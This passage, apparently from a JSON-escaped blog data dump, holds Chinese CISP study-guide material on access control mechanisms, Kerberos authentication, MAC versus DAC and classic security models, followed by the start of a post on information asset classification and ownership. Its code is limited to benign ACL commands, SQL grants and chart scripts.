不适用于大量用户系统的实现 5.5 实现机制 vs 安全模型 关键区别： graph TB A[\"访问控制\"] B[\"实现机制\"] C[\"安全模型\"] A --> B A --> C B --> B1[\"ACL：以资源为中心\"] B --> B2[\"CL：以用户为中心\"] C --> C1[\"BLP：机密性模型\"] C --> C2[\"Biba：完整性模型\"] B --> B3[\"如何实现\"] C --> C3[\"保护什么\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d 类别 实现机制 安全模型 定义 如何存储和检查权限 定义安全策略和规则 层次 实现层面 理论层面 目的 高效实现访问控制 保证安全属性 例子 ACL、CL BLP、Biba、Chinese Wall 关系 可以用于实现模型 需要通过机制实现 理解要点： 实现机制：回答“如何实现”的问题 安全模型：回答“保护什么”的问题 ACL和CL可以用来实现BLP或Biba模型 但BLP和Biba本身不是实现机制 5.6 ACL实际应用示例 Unix/Linux文件系统的ACL： # 查看ACL getfacl &#x2F;path&#x2F;to&#x2F;file # 输出示例 # file: &#x2F;path&#x2F;to&#x2F;file # owner: user1 # group: group1 user::rw- user:user2:r-- group::r-- mask::r-- other::--- # 设置ACL setfacl -m u:user2:r &#x2F;path&#x2F;to&#x2F;file Windows文件系统的ACL： 文件：project.docx ACL： - 用户1 (所有者): 完全控制 - 用户2: 读取、写入 - 用户3: 只读 - 组A: 读取、写入 - Everyone: 拒绝访问 数据库系统的ACL： -- 表的ACL GRANT SELECT, INSERT ON employees TO user1; GRANT SELECT ON employees TO user2; GRANT ALL PRIVILEGES ON employees TO admin; -- 查看权限 SHOW GRANTS FOR user1; 六、Kerberos协议 6.1 Kerberos协议概述 Kerberos是一种常用的集中访问控制协议，通过可信第三方的认证服务，减轻应用服务器的负担。 Kerberos运行环境组成： graph TB A[\"Kerberos运行环境\"] B[\"密钥分发中心KDC\"] C[\"应用服务器Application Server\"] D[\"客户端Client\"] A --> B A --> C A --> D B --> B1[\"认证服务器AS\"] B --> B2[\"票据授权服务器TGS\"] B1 --> B1A[\"验证用户身份\"] B1 --> B1B[\"颁发TGT\"] B2 --> B2A[\"验证TGT\"] B2 --> B2B[\"颁发服务票据\"] C --> C1[\"提供服务\"] C --> C2[\"验证服务票据\"] D --> D1[\"请求认证\"] D --> D2[\"请求服务\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 💡 Kerberos三大组件Kerberos运行环境由三个部分组成： 🔑 密钥分发中心（KDC） 认证服务器（AS）：验证用户身份 票据授权服务器（TGS）：颁发服务票据 可信第三方 🖥️ 应用服务器 提供实际服务 验证服务票据 授权访问资源 👤 客户端 用户终端 请求认证和服务 使用票据访问服务 6.2 Kerberos认证流程 Kerberos协议的三个阶段： 💡 Kerberos认证流程Kerberos认证流程分为三个阶段： 阶段 1：获得票据许可票据（TGT） 客户端向认证服务器（AS）请求认证 AS验证用户身份后返回TGT TGT用于后续请求服务票据 阶段 2：获得服务许可票据（Service Ticket） 客户端向票据授权服务器（TGS）出示TGT TGS验证TGT后颁发服务票据 服务票据用于访问特定服务 阶段 3：获得服务（Access Service） 客户端向应用服务器出示服务票据 服务器验证票据后提供服务 建立安全会话 详细认证流程： sequenceDiagram participant C as 客户端 participant AS as 认证服务器(AS) participant TGS as 票据授权服务器(TGS) participant S as 应用服务器 Note over C,S: 阶段1：获得票据许可票据(TGT) C->>AS: 1. 请求认证（用户名） AS->>C: 2. 返回TGT（用密钥加密） Note over C,S: 阶段2：获得服务许可票据 C->>TGS: 3. 请求服务票据（TGT+服务名） TGS->>C: 4. 返回服务票据（Service Ticket） Note over C,S: 阶段3：获得服务 C->>S: 5. 请求服务（服务票据） S->>C: 6. 提供服务 style AS fill:#e3f2fd,stroke:#1976d2 style TGS fill:#fff3e0,stroke:#f57c00 style S fill:#e8f5e9,stroke:#388e3d 三个阶段详解： 阶段1：获得票据许可票据（TGT） 步骤 操作 说明 1 客户端→AS 发送用户名，请求认证 2 AS验证 检查用户是否存在 3 AS→客户端 返回TGT（用用户密钥加密） 4 客户端解密 使用密码派生的密钥解密TGT 💡 TGT（Ticket Granting Ticket）票据许可票据的特点： 🎫 用于向TGS请求服务票据 🔐 用用户密钥加密 ⏰ 有时效性（通常8-10小时） 🔄 可重复使用，无需每次输入密码 阶段2：获得服务许可票据 步骤 操作 说明 1 客户端→TGS 发送TGT和请求的服务名 2 TGS验证 验证TGT的有效性 3 TGS→客户端 返回服务票据（用服务密钥加密） 4 客户端保存 保存服务票据用于访问服务 💡 Service Ticket（服务票据）服务票据的特点： 🎫 用于访问特定服务 🔐 用服务密钥加密 ⏰ 有时效性（通常5分钟-8小时） 🎯 针对特定服务 阶段3：获得服务 步骤 操作 说明 1 客户端→服务器 发送服务票据 2 服务器验证 解密并验证服务票据 3 服务器→客户端 提供请求的服务 4 建立会话 客户端和服务器建立安全会话 6.3 Kerberos的优势 Kerberos的核心优势： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_c8cdc7d78')); var option = { \"title\": { \"text\": \"Kerberos优势分析\" }, \"tooltip\": { \"trigger\": \"axis\", \"axisPointer\": { \"type\": \"shadow\" } }, \"radar\": { \"indicator\": [ {\"name\": \"安全性\", \"max\": 100}, {\"name\": \"可扩展性\", \"max\": 100}, {\"name\": \"单点登录\", \"max\": 100}, {\"name\": \"性能\", \"max\": 100}, {\"name\": \"易用性\", \"max\": 100} ] }, \"series\": [{ \"type\": \"radar\", \"data\": [ { \"value\": [90, 85, 95, 80, 70], \"name\": \"Kerberos\", \"itemStyle\": {\"color\": \"#2196f3\"} } ] }] }; chart.setOption(option); } })(); 优势详解： 优势 说明 价值 集中认证 统一的认证服务 简化管理，提高安全性 单点登录 一次认证，多次使用 提升用户体验 减轻负担 应用服务器无需存储密码 降低安全风险 相互认证 客户端和服务器双向认证 防止中间人攻击 时效性 票据有时间限制 限制攻击窗口 可扩展 支持大规模部署 适合企业环境 6.4 Kerberos的关键概念 重要术语： Kerberos关键概念： ├── KDC（Key Distribution Center） │ ├── AS（Authentication Server） │ │ ├── 验证用户身份 │ │ └── 颁发TGT │ └── TGS（Ticket Granting Server） │ ├── 验证TGT │ └── 颁发服务票据 ├── 票据类型 │ ├── TGT（Ticket Granting Ticket） │ │ ├── 票据许可票据 │ │ ├── 用于请求服务票据 │ │ └── 有效期：8-10小时 │ └── Service Ticket │ ├── 服务票据 │ ├── 用于访问特定服务 │ └── 有效期：5分钟-8小时 ├── 主体（Principal） │ ├── 用户主体：user@REALM │ └── 服务主体：service&#x2F;host@REALM └── 领域（Realm） ├── Kerberos管理域 ├── 通常对应DNS域 └── 可以建立信任关系 6.5 Kerberos安全特性 安全机制： 💡 Kerberos安全特性核心安全机制： 🔐 加密保护 所有票据都经过加密 密码不在网络传输 使用对称加密算法 ⏰ 时间戳 防止重放攻击 票据有时效性 要求时钟同步 🔄 相互认证 客户端认证服务器 服务器认证客户端 防止中间人攻击 🎫 票据机制 无需重复输入密码 限制票据使用范围 支持票据撤销 安全考虑： 安全问题 防护措施 说明 重放攻击 时间戳+时钟同步 要求5分钟内时钟误差 密码猜测 预认证机制 AS-REQ需要加密时间戳 KDC单点故障 KDC冗余 部署多个KDC 票据窃取 加密+时效性 限制票据使用时间 中间人攻击 相互认证 双向验证身份 6.6 Kerberos应用场景 典型应用： 应用场景 说明 示例 Windows域 Active Directory 企业Windows网络 Linux/Unix MIT Kerberos 企业Unix环境 Web应用 SPNEGO 浏览器SSO 数据库 Kerberos认证 Oracle、PostgreSQL 文件共享 NFS、CIFS 网络文件系统 邮件系统 IMAP、SMTP 企业邮件服务 实际部署示例： 企业Kerberos部署： ├── KDC服务器 │ ├── 主KDC（kdc1.example.com） │ └── 从KDC（kdc2.example.com） ├── 领域配置 │ ├── 领域名：EXAMPLE.COM │ ├── KDC地址：kdc1.example.com:88 │ └── 管理服务器：kdc1.example.com:749 ├── 客户端配置 │ ├── &#x2F;etc&#x2F;krb5.conf │ ├── 默认领域：EXAMPLE.COM │ └── DNS查找：启用 └── 服务配置 ├── HTTP&#x2F;web.example.com@EXAMPLE.COM ├── host&#x2F;server.example.com@EXAMPLE.COM └── nfs&#x2F;fileserver.example.com@EXAMPLE.COM 6.7 Kerberos vs 其他认证协议 认证协议对比： 协议 类型 优势 劣势 适用场景 Kerberos 票据 单点登录、安全性高 配置复杂、需时钟同步 企业内网 LDAP 目录 简单、灵活 密码传输、无SSO 用户管理 RADIUS 远程 广泛支持 安全性较低 VPN、WiFi OAuth 2.0 授权 适合Web、移动 不是认证协议 第三方授权 SAML 联邦 跨域SSO 复杂 企业联邦 七、访问控制实施步骤 7.1 访问控制实施流程 访问控制实施流程四要素： graph LR A[\"1. 主体Subject\"] B[\"2. 访问控制实施部件Access ControlEnforcement\"] C[\"3. 客体Object\"] D[\"4. 访问控制决策部件Access ControlDecision\"] A -->|\"请求访问\"| B B -->|\"查询权限\"| D D -->|\"返回决策\"| B B -->|\"允许/拒绝\"| C style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style D fill:#f3e5f5,stroke:#7b1fa2 7.2 四要素详解 1. 主体（Subject） 主体： ├── 定义：主动发起访问请求的实体 ├── 类型： │ ├── 用户 │ ├── 进程 │ └── 程序 ├── 职责： │ ├── 发起访问请求 │ ├── 提供身份信息 │ └── 等待访问结果 └── 示例：用户请求访问文件 2. 访问控制实施部件（Access Control Enforcement） 访问控制实施部件： ├── 定义：执行访问控制决策的部件 ├── 职责： │ ├── 接收主体的访问请求 │ ├── 向决策部件查询权限 │ ├── 执行决策结果 │ └── 允许或拒绝访问 ├── 位置：主体和客体之间 └── 示例：操作系统内核、安全网关 3. 客体（Object） 客体： ├── 定义：被访问的资源 ├── 类型： │ ├── 文件 │ ├── 目录 │ ├── 数据库 │ └── 网络资源 ├── 特点： │ ├── 被动接受访问 │ ├── 需要保护 │ └── 有安全属性 └── 示例：被访问的文件 4. 访问控制决策部件（Access Control Decision） 访问控制决策部件： ├── 定义：判断是否允许访问的部件 ├── 职责： │ ├── 存储访问控制策略 │ ├── 存储权限信息 │ ├── 根据策略判断权限 │ └── 返回决策结果 ├── 存储内容： │ ├── ACL（访问控制列表） │ ├── 权限矩阵 │ └── 安全策略 └── 示例：权限数据库、策略服务器 7.3 访问控制实施详细流程 完整的访问控制过程： sequenceDiagram participant S as 1.主体 participant E as 2.实施部件 participant D as 4.决策部件 participant O as 3.客体 S->>E: 步骤1: 请求访问客体 E->>D: 步骤2: 查询访问权限 D->>D: 步骤3: 检查策略和权限 D->>E: 步骤4: 返回决策（允许/拒绝） alt 允许访问 E->>O: 步骤5a: 转发访问请求 O->>E: 步骤6a: 返回资源 E->>S: 步骤7a: 返回结果 else 拒绝访问 E->>S: 步骤5b: 返回拒绝信息 end style S fill:#e3f2fd,stroke:#1976d2 style E fill:#fff3e0,stroke:#f57c00 style O fill:#e8f5e9,stroke:#388e3d style D fill:#f3e5f5,stroke:#7b1fa2 7.4 实际应用示例 文件系统访问控制示例： 场景：用户请求读取文件 1. 主体：用户Alice - 发起请求：open(&quot;&#x2F;data&#x2F;report.txt&quot;, READ) 2. 访问控制实施部件：操作系统内核 - 接收请求 - 提取信息：用户&#x3D;Alice, 文件&#x3D;&#x2F;data&#x2F;report.txt, 操作&#x3D;READ - 向决策部件查询 3. 客体：文件&#x2F;data&#x2F;report.txt - 等待访问 4. 访问控制决策部件：文件系统ACL - 查找文件ACL： &#x2F;data&#x2F;report.txt: - Alice: READ, WRITE - Bob: READ - Group_Finance: READ, WRITE - 判断：Alice有READ权限 - 返回：允许访问 结果：实施部件允许Alice读取文件 7.5 关键理解要点 💡 重要区分实施部件 vs 决策部件： 访问控制实施部件： 职责：执行决策 位置：主体和客体之间 功能：控制访问流程 示例：防火墙、操作系统内核 访问控制决策部件： 职责：判断权限 位置：后端策略存储 功能：存储和查询策略 示例：ACL数据库、策略服务器 正确顺序记忆： 访问控制实施步骤： 1. 主体 → 发起请求 2. 访问控制实施部件 → 接收并查询 3. 客体 → 被访问的资源 4. 访问控制决策部件 → 判断权限 口诀：主实客决（主体、实施、客体、决策） 八、访问控制策略 7.1 访问控制策略类型 主要访问控制策略： graph TB A[\"访问控制策略\"] B[\"自主访问控制DAC\"] C[\"强制访问控制MAC\"] D[\"基于角色RBAC\"] E[\"基于属性ABAC\"] A --> B A --> C A --> D A --> E B --> B1[\"资源所有者控制\"] B --> B2[\"灵活但不安全\"] C --> C1[\"系统强制执行\"] C --> C2[\"需要安全标签\"] D --> D1[\"基于角色授权\"] D --> D2[\"便于管理\"] E --> E1[\"基于属性决策\"] E --> E2[\"细粒度控制\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#ffebee,stroke:#c62828 style D fill:#e8f5e9,stroke:#388e3d style E fill:#fff3e0,stroke:#f57c00 7.2 强制访问控制（MAC）的特点 💡 强制访问控制（MAC）的核心特征关键理解： ✅ 安全属性机制 主体和客体都有固定的安全属性 主体有安全许可级别，客体有安全分类级别 系统根据安全属性强制执行访问控制 ✅ 强制性特征 安全属性由安全管理员或操作系统确定 用户不能随意篡改安全属性 系统强制执行，保证安全策略的一致性 ✅ 决策机制 系统通过比较主体和客体的安全属性决定访问 应用安全规则（如BLP的上读下写、Biba的下读上写） 系统自动执行，无需用户干预 强制访问控制（MAC）的正确理解： graph TB A[\"强制访问控制 MAC\"] B[\"主体Subject\"] C[\"客体Object\"] D[\"安全属性\"] E[\"访问决策\"] A --> B A --> C A --> D A --> E B --> B1[\"安全许可级别\"] C --> C1[\"安全分类级别\"] D --> D1[\"由系统管理\"] D --> D2[\"不可随意修改\"] E --> E1[\"系统强制执行\"] E --> E2[\"基于安全策略\"] style A fill:#ffebee,stroke:#c62828 style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 MAC vs DAC对比： 特性 强制访问控制（MAC） 自主访问控制（DAC） 控制主体 系统 资源所有者 安全属性 固定的安全级别 用户定义的权限 修改权限 只能由安全管理员修改 资源所有者可修改 访问决策 基于安全策略自动执行 基于用户授权 灵活性 低 高 安全性 高 相对较低 适用场景 军事、政府高安全环境 一般商业环境 典型模型 BLP、Biba ACL、CL 用户控制 用户不能控制 用户可以控制 强制访问控制的关键特征： 强制访问控制（MAC）的特征： ├── 1. 安全属性 │ ├── 主体有安全许可级别 │ ├── 客体有安全分类级别 │ ├── 由系统或安全管理员确定 │ └── 用户不能随意修改 ├── 2. 强制执行 │ ├── 系统自动执行 │ ├── 基于安全策略 │ ├── 不依赖用户意愿 │ └── 用户无法绕过 ├── 3. 访问决策 │ ├── 比较主体和客体的安全属性 │ ├── 应用安全规则（如BLP、Biba） │ ├── 系统级控制 │ └── 非用户级控制 └── 4. 应用场景 ├── 军事系统 ├── 政府机构 ├── 高安全要求环境 └── 多级安全系统 为什么选项D错误： ⚠️ 常见误区错误说法：强制访问控制是一种对单个用户执行访问控制的过程控制措施 ❌ 问题： 这是对自主访问控制（DAC）的描述 MAC不是&quot;对单个用户&quot;的控制 MAC是系统级的强制性控制 MAC不是用户可控的过程 ✅ 正确理解： MAC是系统级的访问控制 基于安全策略强制执行 用户无法改变访问控制决策 由安全管理员或系统管理 MAC的实际应用示例： 军事系统的MAC实现： 安全级别（从低到高）： 公开 &lt; 内部 &lt; 机密 &lt; 绝密 用户A： ├── 安全许可：机密级 ├── 可以访问：公开、内部、机密级文件 ├── 不能访问：绝密级文件 └── 用户A无法修改自己的安全许可级别 文件X： ├── 安全分类：绝密级 ├── 可被访问：只有绝密级许可的用户 ├── 不能被访问：机密级及以下用户 └── 文件的安全分类由系统管理员设定 访问控制决策： ├── 用户A请求访问文件X ├── 系统比较：用户A（机密级） vs 文件X（绝密级） ├── 应用BLP规则：不能上读（No Read Up） └── 结果：拒绝访问（系统强制执行，用户无法绕过） 5.2 强制访问控制（MAC） 需要安全标签的访问控制策略： **强制访问控制（MAC）**策略需要安全标签。 💡 强制访问控制的特点为什么MAC需要安全标签： 🏷️ 安全标签必需 主体需要安全许可标签 客体需要安全分类标签 系统根据标签强制执行访问控制 🔒 系统强制执行 用户无法改变访问控制 基于安全策略自动决策 防止特权滥用 📊 多级安全 支持分级信息保护 实现BLP或Biba模型 适用于高安全环境 访问控制策略对比： 策略类型 需要安全标签 控制方式 灵活性 安全性 适用场景 强制访问控制（MAC） ✅ 是 系统强制 ⭐⭐ 低 ⭐⭐⭐⭐⭐ 高 军事、政府 自主访问控制（DAC） ❌ 否 用户自主 ⭐⭐⭐⭐⭐ 高 ⭐⭐ 低 一般企业 基于角色（RBAC） ❌ 否 角色授权 ⭐⭐⭐⭐ 高 ⭐⭐⭐ 中 企业应用 基于属性（ABAC） ❌ 否 属性决策 ⭐⭐⭐⭐⭐ 高 ⭐⭐⭐⭐ 高 云计算 八、安全模型总结 8.1 模型分类汇总 按保护目标分类： 安全模型分类： ├── 机密性模型 │ ├── Bell-LaPadula模型 │ └── 信息流模型 ├── 完整性模型 │ ├── Biba模型 │ └── Clark-Wilson模型 └── 多边安全模型 ├── Chinese Wall模型（金融） └── BMA模型（医疗） 8.2 模型选择指南 根据需求选择合适的模型： 需求 推荐模型 原因 保护分级信息机密性 Bell-LaPadula + 信息流 专门设计用于机密性保护 保护数据完整性 Biba + Clark-Wilson 防止数据污染和篡改 金融机构信息保护 Chinese Wall 防止利益冲突 医疗资料保护 BMA 保护患者隐私 需要安全标签 强制访问控制（MAC） 系统强制执行 九、总结 访问控制的核心要点： 机密性保护：使用Bell-LaPadula模型和信息流模型 完整性保护：使用Biba模型和Clark-Wilson模型 多边安全：Chinese Wall用于金融，BMA用于医疗 BLP规则：上读下写，保护机密性 Biba规则：下读上写，保护完整性 强制访问控制：需要安全标签，系统强制执行 🎯 关键要点 Bell-LaPadula模型和信息流模型保护机密性 Biba模型和Clark-Wilson模型保护完整性 Chinese Wall模型用于金融机构 BMA模型用于医疗资料保护 BLP模型：上读下写（No Read Up, No Write Down） Biba模型：下读上写（No Read Down, No Write Up） 强制访问控制（MAC）需要安全标签 Chinese Wall和BMA都是多边安全模型 访问控制实施流程四要素：主体→实施部件→客体→决策部件 实施部件执行决策，决策部件判断权限 💡 实践建议 根据保护目标选择合适的安全模型 机密性和完整性可以同时实施 多边安全模型适用于特定行业 强制访问控制适用于高安全环境 定期审查和更新访问控制策略","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：资产管理","slug":"2025/10/CISP-Asset-Management-zh-CN","date":"un55fin55","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Asset-Management/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Asset-Management/","excerpt":"深入解析CISP认证中的资产管理知识点，涵盖资产分类、资产清单和资产责任人管理。","text":"资产管理是信息安全管理的基础，只有明确了组织拥有哪些资产，才能有效地保护这些资产。 一、资产分类体系 1.1 信息资产分类 信息资产可以分为多个类别，每个类别有不同的管理要求。 graph TB A[\"信息资产\"] B[\"设备资产\"] C[\"网络资产\"] D[\"平台资产\"] E[\"数据资产\"] F[\"介质资产\"] G[\"无形资产\"] A --> B A --> C A --> D A --> E A --> F A --> G B --> B1[\"机房设施\"] B --> B2[\"周边设施\"] B --> B3[\"管理终端\"] C --> C1[\"网络设备\"] C --> C2[\"网络安全设备\"] C --> C3[\"主干线路\"] D --> D1[\"操作系统\"] D --> D2[\"基础服务平台\"] D --> D3[\"中间件\"] E --> E1[\"电子数据\"] E --> E2[\"纸质文档\"] E --> E3[\"数据库\"] F --> F1[\"存储介质\"] F --> F2[\"软件介质\"] F --> F3[\"备份介质\"] G --> G1[\"客户关系\"] G --> G2[\"商业信誉\"] G --> G3[\"企业品牌\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#f3e5f5,stroke:#7b1fa2 style D fill:#e8f5e9,stroke:#388e3d style E fill:#fff3e0,stroke:#f57c00 style F fill:#fce4ec,stroke:#c2185b style G fill:#e1f5fe,stroke:#0277bd 二、各类资产详解 2.1 设备类资产 设备类资产包括： 资产类型 具体内容 示例 机房设施 数据中心基础设施 机柜、空调、UPS、消防系统 周边设施 支持性设施 监控系统、门禁系统、配电系统 管理终端 管理和操作设备 服务器、工作站、笔记本电脑 💡 设备资产特点设备资产的管理重点： 📍 物理位置管理 🔧 维护保养记录 📊 生命周期管理 🔒 物理安全控制 不属于设备资产的： ❌ 操作系统（属于平台资产） ❌ 应用软件（属于平台资产） ❌ 数据文件（属于数据资产） 2.2 网络类资产 网络类资产包括： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_ada651b8c')); var option = { \"title\": { \"text\": \"网络资产分布\" }, \"tooltip\": { \"trigger\": \"item\" }, \"series\": [{ \"type\": \"pie\", \"radius\": [\"40%\", \"70%\"], \"data\": [ {\"value\": 40, \"name\": \"网络设备\", \"itemStyle\": {\"color\": \"#2196f3\"}}, {\"value\": 35, \"name\": \"网络安全设备\", \"itemStyle\": {\"color\": \"#4caf50\"}}, {\"value\": 25, \"name\": \"主干线路\", \"itemStyle\": {\"color\": \"#ff9800\"}} ], \"label\": { \"show\": true, \"formatter\": \"{b}: {d}%\" } }] }; chart.setOption(option); } })(); 资产类型 具体内容 示例 网络设备 网络连接和传输设备 路由器、交换机、无线AP 网络安全设备 网络安全防护设备 防火墙、IDS/IPS、WAF 主干线路 网络传输线路 光纤、专线、互联网接入 不属于网络资产的： ❌ 基础服务平台（属于平台资产） ❌ 网络管理软件（属于平台资产） 2.3 平台类资产 平台类资产包括： 平台资产层次： ├── 操作系统 │ ├── Windows Server │ ├── Linux │ └── Unix ├── 基础服务平台 │ ├── 数据库系统 │ ├── 中间件 │ └── 应用服务器 └── 应用软件 ├── 业务应用 ├── 办公软件 └── 安全软件 ⚠️ 平台资产识别常见误区： ❌ 错误：将操作系统归类为设备资产 ✅ 正确：操作系统属于平台资产 ❌ 错误：将基础服务平台归类为网络资产 ✅ 正确：基础服务平台属于平台资产 记忆要点： 硬件 = 设备资产 软件 = 平台资产 数据 = 数据资产 2.4 数据类资产 数据类资产包括： 资产类型 具体内容 示例 电子数据 数字化存储的数据 数据库记录、电子文档、邮件 纸质文档 物理形式的文档 合同、报告、设计图纸 数据库 结构化数据存储 业务数据库、配置数据库 不属于数据资产的： ❌ 凭证（属于介质资产） ❌ 存储介质本身（属于介质资产） 💡 数据资产特殊性数据资产的特点： 📊 价值最高 🔄 易复制传播 ⏰ 时效性强 🔒 需要最严格保护 2.5 介质类资产 介质类资产包括： graph LR A[\"介质资产\"] B[\"存储介质\"] C[\"软件介质\"] D[\"备份介质\"] A --> B A --> C A --> D B --> B1[\"硬盘\"] B --> B2[\"U盘\"] B --> B3[\"光盘\"] C --> C1[\"安装光盘\"] C --> C2[\"授权密钥\"] C --> C3[\"软件包\"] D --> D1[\"备份磁带\"] D --> D2[\"备份硬盘\"] D --> D3[\"云备份\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style D fill:#f3e5f5,stroke:#7b1fa2 不属于介质资产的： ❌ 纸质文档（属于数据资产） ❌ 电子凭证（属于数据资产） 2.6 无形资产 无形资产包括： 资产类型 具体内容 价值体现 客户关系 客户资源和关系网络 业务持续性、市场份额 商业信誉 企业声誉和信用 品牌价值、市场地位 企业品牌 品牌形象和知名度 市场竞争力、溢价能力 不属于无形资产的： ❌ 电子数据（属于数据资产） ❌ 客户数据库（属于数据资产） 💡 无形资产的重要性为什么无形资产重要： 💰 价值难以量化但影响巨大 🛡️ 一旦受损难以恢复 📈 直接影响企业市场价值 ⚖️ 可能涉及法律责任 三、资产责任人管理 3.1 资产责任人角色 每个信息资产都必须明确其责任人。 graph TB A[\"信息资产\"] B[\"所有者(Owner)\"] C[\"管理者(Custodian)\"] D[\"使用者(User)\"] A --> B A --> C A --> D B --> B1[\"拥有资产\"] B --> B2[\"决定保护级别\"] B --> B3[\"授权访问\"] C --> C1[\"日常管理\"] C --> C2[\"实施保护措施\"] C --> C3[\"监控使用\"] D --> D1[\"使用资产\"] D --> D2[\"遵守规定\"] D --> D3[\"报告问题\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e3f2fd,stroke:#1976d2 各角色职责对比： 角色 主要职责 权限 责任 所有者 资产归属、保护级别决策 最高决策权 资产安全最终责任 管理者 日常管理、安全措施实施 管理和配置权限 保护措施有效性 使用者 按规定使用资产 授权范围内使用 合规使用责任 🚨 必须明确的责任人信息资产必须明确： ✅ 所有者 - 谁拥有这个资产 ✅ 管理者 - 谁负责管理这个资产 ✅ 使用者 - 谁在使用这个资产 ❌ 不需要明确： 厂商（外部供应商，非资产责任人） 原因： 厂商只是提供产品或服务 不对资产的安全负责 不参与日常资产管理 3.2 资产清单管理 资产清单应包含的信息： 资产清单模板： ├── 基本信息 │ ├── 资产编号 │ ├── 资产名称 │ ├── 资产类别 │ └── 资产位置 ├── 责任信息 │ ├── 所有者 │ ├── 管理者 │ └── 使用部门 ├── 技术信息 │ ├── 型号规格 │ ├── 配置信息 │ └── 版本信息 ├── 安全信息 │ ├── 保密等级 │ ├── 重要程度 │ └── 保护措施 └── 管理信息 ├── 采购日期 ├── 维护记录 └── 变更历史 四、资产管理流程 4.1 资产生命周期 graph LR A[\"采购/创建\"] --> B[\"登记入库\"] B --> C[\"分配使用\"] C --> D[\"维护管理\"] D --> E[\"变更更新\"] E --> F[\"退役处置\"] C --> D D --> E E --> D style A fill:#e8f5e9,stroke:#388e3d style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#fce4ec,stroke:#c2185b style F fill:#ffebee,stroke:#c62828 各阶段管理要点： 阶段 管理要点 关键活动 采购/创建 需求评估、安全要求 立项审批、采购流程 登记入库 资产标识、信息录入 编号分配、清单登记 分配使用 责任人确认、授权 交接手续、使用培训 维护管理 定期检查、更新维护 巡检记录、维护日志 变更更新 变更审批、影响评估 变更记录、测试验证 退役处置 数据清除、安全处置 退役审批、销毁记录 五、资产管理最佳实践 5.1 资产盘点 定期盘点要求： 📅 至少每年进行一次全面盘点 🔍 季度进行抽查盘点 📊 重要资产每月核查 🚨 异常情况立即盘点 5.2 资产保护 分级保护原则： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_4f89e17a5')); var option = { \"title\": { \"text\": \"资产保护级别分布\" }, \"tooltip\": { \"trigger\": \"axis\", \"axisPointer\": { \"type\": \"shadow\" } }, \"xAxis\": { \"type\": \"category\", \"data\": [\"公开\", \"内部\", \"机密\", \"绝密\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"保护强度\" }, \"series\": [{ \"type\": \"bar\", \"data\": [ {\"value\": 20, \"itemStyle\": {\"color\": \"#4caf50\"}}, {\"value\": 50, \"itemStyle\": {\"color\": \"#2196f3\"}}, {\"value\": 80, \"itemStyle\": {\"color\": \"#ff9800\"}}, {\"value\": 100, \"itemStyle\": {\"color\": \"#f44336\"}} ], \"label\": { \"show\": true, \"position\": \"top\" } }] }; chart.setOption(option); } })(); 五、资产敏感性管理 5.1 敏感性定义 信息资产敏感性是指资产的机密性特征。 💡 敏感性即机密性敏感性的定义： 敏感性，即机密性（Confidentiality），是指信息资产接受授权访问、限制和拒绝未授权访问的特性。 与其他安全属性的区别： 🔒 机密性（Confidentiality） = 敏感性 ✅ ✅ 完整性（Integrity） ≠ 敏感性 ❌ 🔄 可用性（Availability） ≠ 敏感性 ❌ 🛡️ 安全性（Security） = 综合概念，包含机密性、完整性、可用性 5.2 敏感性标识方法 常用标识方式： graph TB A[\"敏感性标识方法\"] B[\"不干胶方式\"] C[\"印章方式\"] D[\"电子标签\"] E[\"个人签名\"] A --> B A --> C A --> D A --> E B --> B1[\"✅ 适用\"] B --> B2[\"易于粘贴和更换\"] C --> C1[\"✅ 适用\"] C --> C2[\"正式文档标识\"] D --> D1[\"✅ 适用\"] D --> D2[\"电子化管理\"] E --> E1[\"❌ 不适用\"] E --> E2[\"非正式标识方式\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#c8e6c9,stroke:#2e7d32 style D fill:#c8e6c9,stroke:#2e7d32 style E fill:#ffebee,stroke:#c62828 标识方式对比： 标识方式 是否适用 特点 适用场景 不干胶方式 ✅ 是 易于粘贴、可更换 纸质文档、设备 印章方式 ✅ 是 正式、权威 正式文档、合同 电子标签 ✅ 是 可追踪、自动化 电子资产、设备 个人签名 ❌ 否 非正式、不规范 不适用于敏感性标识 ⚠️ 个人签名不适用为什么个人签名不适用于敏感性标识： 缺乏标准化 不够正式和权威 难以统一管理 无法清晰表达敏感等级 5.3 资产保密期限 不同类型的信息资产有不同的保密期限要求。 保密期限规定： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_1e1b4d8d9')); var option = { \"title\": { \"text\": \"不同资产类型的保密期限\" }, \"tooltip\": { \"trigger\": \"axis\", \"axisPointer\": { \"type\": \"shadow\" } }, \"xAxis\": { \"type\": \"category\", \"data\": [\"设施\", \"网络\", \"平台\", \"介质\", \"应用\"] }, \"yAxis\": { \"type\": \"category\", \"data\": [\"短期\", \"中期\", \"长期\"] }, \"series\": [{ \"type\": \"bar\", \"data\": [ {\"value\": 2, \"itemStyle\": {\"color\": \"#4caf50\"}}, {\"value\": 2, \"itemStyle\": {\"color\": 